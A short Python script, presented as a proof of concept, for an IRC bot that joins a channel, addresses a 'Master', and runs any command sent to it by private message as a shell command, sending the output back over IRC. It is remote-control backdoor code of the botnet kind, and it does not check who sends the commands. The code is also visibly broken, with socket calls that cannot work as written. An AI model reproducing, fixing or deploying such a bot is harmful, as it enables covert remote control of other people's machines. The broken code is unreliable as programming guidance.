#!/usr/bin/env python3

# This is just a PoC, and it comes with no warranty or anything.
# Use it at your own risk. it MUST NOT be used in a production environment or anything other than testing.
# PLEASE respect other people's privacy. Only tested on Linux BTW

import asyncio
import os
from socket import AF_INET, SO_REUSEADDR, SOCK_STREAM, SOL_SOCKET, socket
import time

HOST = "chat.freenode.net"  # You can change this to whatever you want
PORT = 6667

NICK = "Your Nick Name"
IDENT = "Your Identity"
REALNAME = "Your REAL Name"
MASTER = "The Master of this particular Slave"

CHANNEL = "The Channel To join"

readbuffer = ""

loop = asyncio.get_event_loop()

async def initiate_connection(address):
    sock = socket(AF_INET, SOCK_STREAM)
    sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    sock.bind(address)
    sock.listen(5)
    sock.setblocking(False)
    sock.send(bytes("NICK %s\r\n" % NICK, "UTF-8"))
    sock.send(bytes("USER %s %s bla :%s\r\n" % (IDENT, HOST, REALNAME), "UTF-8"))
    sock.send(bytes("JOIN #%s \r\n" % (CHANNEL), "UTF-8"))
    sock.send(bytes("PRIVMSG %s :Hello Master :) Tell me commands to do \r\n" % MASTER, "UTF-8"))
    while True:
        client, addr = await loop.sock_accept(sock)
        print('New command', addr)
        loop.create_task(command_handler(client))


async def command_handler(client):
    with client:
        while True:
            data = await loop.sock_recv(client, 10000)
            if not data:
                break
            temp = str.split(data, "\n")
            data = temp.pop()

            for line in temp:
                line = str.rstrip(line)
                line = str.split(line)

                if line[0] == "PING":
                    loop.sock_sendall(bytes("PONG %s\r\n" % line[1], "UTF-8"))
                if line[1] == "PRIVMSG":
                    sender = ""
                    for char in line[0]:
                        if char == "!":
                            break
                        if char != ":":
                            sender += char
                    size = len(line)
                    i = 3
                    message = ""
                    while i < size:
                        message += line[i] + " "
                        i = i + 1
                    message.lstrip(":")
                    loop.sock_sendall(bytes("PRIVMSG %s :Executing-> %s \r\n" % (sender, message[1:]), "UTF-8"))
                    # Removing the first Char and sent it to shell
                    # response = os.system(message[1:])
                    p = os.popen(message[1:] + " 2>&1", "r")
                    # Puts out the first 20 lines. There's a good reason for this.
                    n = 0
                    while n < 20:
                        line = p.readline()
                        if not line:
                            break
                        loop.sock_sendall(bytes("PRIVMSG %s :Response -> %s \r\n" % (sender, str(line)), "UTF-8"))
                        time.sleep(1)
                        n += 1
                for index, i in enumerate(line):
                    print(line[index])
    print('Connection Closed!')
